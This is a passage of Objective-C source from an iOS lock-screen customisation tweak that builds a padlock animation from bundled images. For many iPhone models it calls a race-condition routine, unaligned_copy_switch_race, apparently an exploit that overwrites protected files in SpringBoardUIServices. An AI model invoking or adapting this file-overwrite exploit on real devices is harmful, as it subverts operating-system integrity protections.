        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            NSLog(@"downloading a fresh copy of main.caml");
            NSString *urlToDownload = @"https://raw.githubusercontent.com/haxi0/TrollLock-Reborn/main/assets/main.caml";
            NSURL  *url = [NSURL URLWithString:urlToDownload];
            NSData *urlData = [NSData dataWithContentsOfURL:url];
            if ( urlData )
            {
                NSArray       *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
                NSString  *documentsDirectory = [paths objectAtIndex:0];
                NSString  *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,@"main.caml"];
                
                dispatch_async(dispatch_get_main_queue(), ^{
                    [urlData writeToFile:filePath atomically:YES];
                    [fileContents writeToFile:filePath atomically:YES];
                    NSLog(@"yay! success");
                });
            }
            
        });
        
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
            if ([model isEqual:@"iPhone14,7"]) { // iPhone 14
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone13,2"]) { // iPhone 12
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone13,3"]) { // iPhone 12 Pro
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone13,4"]) { // iPhone 12 Pro Max
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone13,1"]) { // iPhone 12 Mini
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone14,3"]) { // iPhone 13 Pro Max
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone14,2"]) { // iPhone 13 Pro
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone14,5"]) { // iPhone 13
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone14,4"]) { // iPhone 13 Mini
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone10,3"]) { // iPhone X (Global)
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone10,6"]) { // iPhone X (GSM)
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone15,2"]) { // iPhone 14 Pro
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-d73.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone15,3"]) { // iPhone 14 Pro Max
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-d73.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone11,2"]) { // iPhone XS
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone11,6"]) { // iPhone XS Max
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone11,4"]) { // iPhone XS Max (China)
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone12,1"]) { // iPhone 11
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@2x-896h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone12,3"]) { // iPhone 11 Pro
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@2x-896h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone12,5"]) { // iPhone 11 Pro Max
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone11,8"]) { // iPhone XR
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@2x-896h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
        });
    } else {
        NSString *troll1 = [[NSBundle mainBundle] pathForResource:@"trollformation1" ofType:@"png"];
        NSString *troll2 = [[NSBundle mainBundle] pathForResource:@"trollformation2" ofType:@"png"];
        NSString *troll3 = [[NSBundle mainBundle] pathForResource:@"trollformation3" ofType:@"png"];
        NSString *troll4 = [[NSBundle mainBundle] pathForResource:@"trollformation4" ofType:@"png"];
        NSString *troll5 = [[NSBundle mainBundle] pathForResource:@"trollformation5" ofType:@"png"];
        NSString *troll6 = [[NSBundle mainBundle] pathForResource:@"trollformation6" ofType:@"png"];
        NSString *troll7 = [[NSBundle mainBundle] pathForResource:@"trollformation7" ofType:@"png"];
        NSString *troll8 = [[NSBundle mainBundle] pathForResource:@"trollformation8" ofType:@"png"];
        NSString *troll9 = [[NSBundle mainBundle] pathForResource:@"trollformation9" ofType:@"png"];
        NSString *troll10 = [[NSBundle mainBundle] pathForResource:@"trollformation10" ofType:@"png"];
        NSString *troll11 = [[NSBundle mainBundle] pathForResource:@"trollformation11" ofType:@"png"];
        NSString *troll12 = [[NSBundle mainBundle] pathForResource:@"trollformation12" ofType:@"png"];
        NSString *troll13 = [[NSBundle mainBundle] pathForResource:@"trollformation13" ofType:@"png"];
        NSString *troll14 = [[NSBundle mainBundle] pathForResource:@"trollformation14" ofType:@"png"];
        NSString *troll15 = [[NSBundle mainBundle] pathForResource:@"trollformation15" ofType:@"png"];
        NSString *troll16 = [[NSBundle mainBundle] pathForResource:@"trollformation16" ofType:@"png"];
        NSString *troll17 = [[NSBundle mainBundle] pathForResource:@"trollformation17" ofType:@"png"];
        NSString *troll18 = [[NSBundle mainBundle] pathForResource:@"trollformation18" ofType:@"png"];
        NSString *troll19 = [[NSBundle mainBundle] pathForResource:@"trollformation19" ofType:@"png"];
        NSString *troll20 = [[NSBundle mainBundle] pathForResource:@"trollformation20" ofType:@"png"];
        NSString *troll21 = [[NSBundle mainBundle] pathForResource:@"trollformation21" ofType:@"png"];
        NSString *troll22 = [[NSBundle mainBundle] pathForResource:@"trollformation22" ofType:@"png"];
        NSString *troll23 = [[NSBundle mainBundle] pathForResource:@"trollformation23" ofType:@"png"];
        NSString *troll24 = [[NSBundle mainBundle] pathForResource:@"trollformation24" ofType:@"png"];
        NSString *troll25 = [[NSBundle mainBundle] pathForResource:@"trollformation25" ofType:@"png"];
        NSString *troll26 = [[NSBundle mainBundle] pathForResource:@"trollformation26" ofType:@"png"];
        NSString *troll27 = [[NSBundle mainBundle] pathForResource:@"trollformation27" ofType:@"png"];
        NSString *troll28 = [[NSBundle mainBundle] pathForResource:@"trollformation28" ofType:@"png"];
        NSString *troll29 = [[NSBundle mainBundle] pathForResource:@"trollformation29" ofType:@"png"];
        NSString *troll30 = [[NSBundle mainBundle] pathForResource:@"trollformation30" ofType:@"png"];
        NSString *troll31 = [[NSBundle mainBundle] pathForResource:@"trollformation31" ofType:@"png"];
        NSString *troll32 = [[NSBundle mainBundle] pathForResource:@"trollformation32" ofType:@"png"];
        NSString *troll33 = [[NSBundle mainBundle] pathForResource:@"trollformation33" ofType:@"png"];
        NSString *troll34 = [[NSBundle mainBundle] pathForResource:@"trollformation34" ofType:@"png"];
        NSString *troll35 = [[NSBundle mainBundle] pathForResource:@"trollformation35" ofType:@"png"];
        NSString *troll36 = [[NSBundle mainBundle] pathForResource:@"trollformation36" ofType:@"png"];
        NSString *trolley = [[NSBundle mainBundle] pathForResource:@"trollformation37" ofType:@"png"];
        NSString *troll38 = [[NSBundle mainBundle] pathForResource:@"trollformation38" ofType:@"png"];
        NSString *troll39 = [[NSBundle mainBundle] pathForResource:@"trollformation39" ofType:@"png"];
        NSString *troll40 = [[NSBundle mainBundle] pathForResource:@"trollformation40" ofType:@"png"];
        NSString *fileContents = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
<caml xmlns=\"http://www.apple.com/CoreAnimation/1.0\">\
  <CALayer allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 69.0 100.0\" contentsFormat=\"RGBA8\" name=\"root\" position=\"34.5 50.0\">\
    <sublayers>\
      <CALayer id=\"#3\" allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 147.0 132.0\" contentsFormat=\"RGBA8\" geometryFlipped=\"1\" name=\"container\" position=\"34.5 50.0\">\
          <sublayers>\
            <CALayer id=\"#2\" allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 147.0 132.0\" contentsFormat=\"RGBA8\" name=\"shake\" position=\"73.5 66.0\">\
              <sublayers>\
                <CALayer id=\"#1\" allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 147.0 132.0\" contentsFormat=\"RGBA8\" name=\"shackle\" opacity=\"1\" position=\"73.5 66.0\">\
                  <contents type=\"CGImage\" src=\"troll1\"/>\
                </CALayer>\
              </sublayers>\
            </CALayer>\
          </sublayers>\
        </CALayer>\
      </sublayers>\
    <states>\
      <LKState name=\"Sleep\">\
    <elements>\
      <LKStateSetValue final=\"false\" targetId=\"#3\" keyPath=\"transform.scale.xy\">\
        <value type=\"real\" value=\"0.75\"/>\
      </LKStateSetValue>\
      <LKStateSetValue final=\"false\" targetId=\"#3\" keyPath=\"opacity\">\
        <value type=\"integer\" value=\"0\"/>\
      </LKStateSetValue>\
    </elements>\
      </LKState>\
      <LKState name=\"Locked\"/>\
      <LKState name=\"Unlocked\">\
    <elements>\
      <LKStateSetValue final=\"false\" targetId=\"#1\" keyPath=\"contents\">\
        <value type=\"CGImage\" src=\"trolla40\"/>\
      </LKStateSetValue>\
    </elements>\
      </LKState>\
      <LKState name=\"Error\">\
    <elements>\
      <LKStateSetValue final=\"false\" targetId=\"#2\" keyPath=\"position.x\">\
        <value type=\"real\" value=\"113.5\"/>\
      </LKStateSetValue>\
      <LKStateSetValue final=\"false\" targetId=\"#3\" keyPath=\"position.x\">\
        <value type=\"real\" value=\"-5.5\"/>\
      </LKStateSetValue>\
    </elements>\
      </LKState>\
    </states>\
    <stateTransitions>\
      <LKStateTransition fromState=\"*\" toState=\"Unlocked\">\
    <elements>\
      <LKStateTransitionElement final=\"false\" key=\"contents\" targetId=\"#1\">\
        <animation type=\"CAKeyframeAnimation\" calculationMode=\"discrete\" keyPath=\"contents\" duration=\"1\" fillMode=\"backwards\" timingFunction=\"linear\">\
          <keyTimes>\
                <real value=\"0\"/>\
                <real value=\"0.01666666666\"/>\
                <real value=\"0.03333333333\"/>\
                <real value=\"0.05\"/>\
                <real value=\"0.06666666666\"/>\
                <real value=\"0.08333333333\"/>\
                <real value=\"0.1\"/>\
                <real value=\"0.116666666667\"/>\
                <real value=\"0.133333333333\"/>\
                <real value=\"0.15\"/>\
                <real value=\"0.166666666667\"/>\
                <real value=\"0.183333333333\"/>\
                <real value=\"0.2\"/>\
                <real value=\"0.216666666667\"/>\
                <real value=\"0.233333333333\"/>\
                <real value=\"0.25\"/>\
                <real value=\"0.266666666667\"/>\
                <real value=\"0.283333333333\"/>\
                <real value=\"0.3\"/>\
                <real value=\"0.316666666667\"/>\
                <real value=\"0.333333333333\"/>\
                <real value=\"0.35\"/>\
                <real value=\"0.366666666667\"/>\
                <real value=\"0.383333333333\"/>\
                <real value=\"0.4\"/>\
                <real value=\"0.416666666667\"/>\
                <real value=\"0.433333333333\"/>\
                <real value=\"0.45\"/>\
                <real value=\"0.466666666667\"/>\
                <real value=\"0.483333333333\"/>\
                <real value=\"0.5\"/>\
                <real value=\"0.516666666667\"/>\
                <real value=\"0.533333333333\"/>\
                <real value=\"0.55\"/>\
                <real value=\"0.566666666667\"/>\
                <real value=\"0.583333333333\"/>\
                <real value=\"0.6\"/>\
                <real value=\"0.616666666667\"/>\
                <real value=\"0.633333333333\"/>\
                <real value=\"0.65\"/>\
                <real value=\"0.666666666667\"/>\
                <real value=\"0.683333333333\"/>\
                <real value=\"0.7\"/>\
                <real value=\"0.716666666667\"/>\
                <real value=\"0.733333333333\"/>\
                <real value=\"0.75\"/>\
                <real value=\"0.766666666667\"/>\
                <real value=\"0.783333333333\"/>\
                <real value=\"0.8\"/>\
                <real value=\"0.816666666667\"/>\
                <real value=\"0.833333333333\"/>\
                <real value=\"0.85\"/>\
                <real value=\"0.866666666667\"/>\
                <real value=\"0.883333333333\"/>\
                <real value=\"0.9\"/>\
          </keyTimes>\
          <values>\
                <CGImage src=\"troll1\"/>\
                <CGImage src=\"troll2\"/>\
                <CGImage src=\"troll3\"/>\
                <CGImage src=\"troll4\"/>\
                <CGImage src=\"troll5\"/>\
                <CGImage src=\"troll6\"/>\
                <CGImage src=\"troll7\"/>\
                <CGImage src=\"troll8\"/>\
                <CGImage src=\"troll9\"/>\
                <CGImage src=\"trolling10\"/>\
                <CGImage src=\"trolling11\"/>\
                <CGImage src=\"trolling12\"/>\
                <CGImage src=\"trolling13\"/>\
                <CGImage src=\"trolling14\"/>\
                <CGImage src=\"trolling15\"/>\
                <CGImage src=\"trolling16\"/>\
                <CGImage src=\"trolling17\"/>\
                <CGImage src=\"trolling18\"/>\
                <CGImage src=\"trolling19\"/>\
                <CGImage src=\"trolley20\"/>\
                <CGImage src=\"trolley21\"/>\
                <CGImage src=\"trolley22\"/>\
                <CGImage src=\"trolley23\"/>\
                <CGImage src=\"trolley24\"/>\
                <CGImage src=\"trolley25\"/>\
                <CGImage src=\"trolley26\"/>\
                <CGImage src=\"trolley27\"/>\
                <CGImage src=\"trolley28\"/>\
                <CGImage src=\"trolley29\"/>\
                <CGImage src=\"trolla30\"/>\
                <CGImage src=\"trolla31\"/>\
                <CGImage src=\"trolla32\"/>\
                <CGImage src=\"trolla33\"/>\
                <CGImage src=\"trolla34\"/>\
                <CGImage src=\"trolla35\"/>\
                <CGImage src=\"trolla36\"/>\
                <CGImage src=\"trolla37\"/>\
                <CGImage src=\"trolla38\"/>\
                <CGImage src=\"trolla39\"/>\
                <CGImage src=\"trolla40\"/>\
          </values>\
        </animation>\
      </LKStateTransitionElement>\
    </elements>\
      </LKStateTransition>\
      <LKStateTransition fromState=\"Unlocked\" toState=\"*\">\
    <elements/>\
      </LKStateTransition>\
      <LKStateTransition fromState=\"*\" toState=\"Sleep\">\
    <elements>\
      <LKStateTransitionElement final=\"false\" key=\"transform.scale.xy\" targetId=\"#3\">\
        <animation type=\"CABasicAnimation\" keyPath=\"transform.scale.xy\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
      </LKStateTransitionElement>\
      <LKStateTransitionElement final=\"false\" key=\"opacity\" targetId=\"#3\">\
        <animation type=\"CABasicAnimation\" keyPath=\"opacity\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
      </LKStateTransitionElement>\
    </elements>\
      </LKStateTransition>\
      <LKStateTransition fromState=\"Sleep\" toState=\"*\">\
    <elements>\
      <LKStateTransitionElement final=\"false\" key=\"transform.scale.xy\" targetId=\"#3\">\
        <animation type=\"CABasicAnimation\" keyPath=\"transform.scale.xy\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
      </LKStateTransitionElement>\
      <LKStateTransitionElement final=\"false\" key=\"opacity\" targetId=\"#3\">\
        <animation type=\"CABasicAnimation\" keyPath=\"opacity\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
      </LKStateTransitionElement>\
    </elements>\
      </LKStateTransition>\
      <LKStateTransition fromState=\"*\" toState=\"Error\">\
    <elements>\
      <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#3\">\
        <animation type=\"CABasicAnimation\" keyPath=\"position.x\" duration=\"0.2\" fillMode=\"both\" timingFunction=\"default\"/>\
      </LKStateTransitionElement>\
      <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#2\">\
        <animation type=\"CASpringAnimation\" damping=\"40\" mass=\"3\" stiffness=\"2200\" keyPath=\"position.x\" beginTime=\"0.075\" duration=\"0.78\" fillMode=\"both\" speed=\"1.4\"/>\
      </LKStateTransitionElement>\
    </elements>\
      </LKStateTransition>\
      <LKStateTransition fromState=\"Error\" toState=\"*\">\
    <elements>\
      <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#3\">\
        <animation type=\"CABasicAnimation\" keyPath=\"position.x\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
      </LKStateTransitionElement>\
      <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#2\">\
        <animation type=\"CABasicAnimation\" keyPath=\"position.x\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
      </LKStateTransitionElement>\
    </elements>\
      </LKStateTransition>\
    </stateTransitions>\
  </CALayer>\
</caml>\
";
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll1"
                                                               withString:troll1];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll2"
                                                               withString:troll2];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll3"
                                                               withString:troll3];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll4"
                                                               withString:troll4];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll5"
                                                               withString:troll5];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll6"
                                                               withString:troll6];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll7"
                                                               withString:troll7];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll8"
                                                               withString:troll8];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll9"
                                                               withString:troll9];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling10"
                                                               withString:troll10];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling11"
                                                               withString:troll11];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling12"
                                                               withString:troll12];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling13"
                                                               withString:troll13];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling14"
                                                               withString:troll14];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling15"
                                                               withString:troll15];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling16"
                                                               withString:troll16];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling17"
                                                               withString:troll17];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling18"
                                                               withString:troll18];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling19"
                                                               withString:troll19];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley20"
                                                               withString:troll20];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley21"
                                                               withString:troll21];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley22"
                                                               withString:troll22];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley23"
                                                               withString:troll23];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley24"
                                                               withString:troll24];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley25"
                                                               withString:troll25];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley26"
                                                               withString:troll26];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley27"
                                                               withString:troll27];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley28"
                                                               withString:troll28];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley29"
                                                               withString:troll29];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla30"
                                                               withString:troll30];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla31"
                                                               withString:troll31];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla32"
                                                               withString:troll32];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla33"
                                                               withString:troll33];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla34"
                                                               withString:troll34];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla35"
                                                               withString:troll35];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla36"
                                                               withString:troll36];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla37"
                                                               withString:trolley];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla38"
                                                               withString:troll38];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla39"
                                                               withString:troll39];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla40"
                                                               withString:troll40];
        
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            NSLog(@"downloading a fresh copy of main.caml");
            NSString *urlToDownload = @"https://raw.githubusercontent.com/haxi0/TrollLock-Reborn/main/assets/main.caml";
            NSURL  *url = [NSURL URLWithString:urlToDownload];
            NSData *urlData = [NSData dataWithContentsOfURL:url];
            if ( urlData )
            {
                NSArray       *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
                NSString  *documentsDirectory = [paths objectAtIndex:0];
                NSString  *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,@"main.caml"];

                dispatch_async(dispatch_get_main_queue(), ^{
                    [urlData writeToFile:filePath atomically:YES];
                    [fileContents writeToFile:filePath atomically:YES];
                    NSLog(@"yay! success");
                });
            }
            
        });
        
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
            if ([model isEqual:@"iPhone14,7"]) { // iPhone 14
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone13,2"]) { // iPhone 12
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone13,3"]) { // iPhone 12 Pro
                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
                const char *model_path = dirName.UTF8String;
                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
                g_arg_overwrite_file_path = model_path;
                unaligned_copy_switch_race();
            }
            
            if ([model isEqual:@"iPhone13,4"]) { // iPhone 12 Pro Max
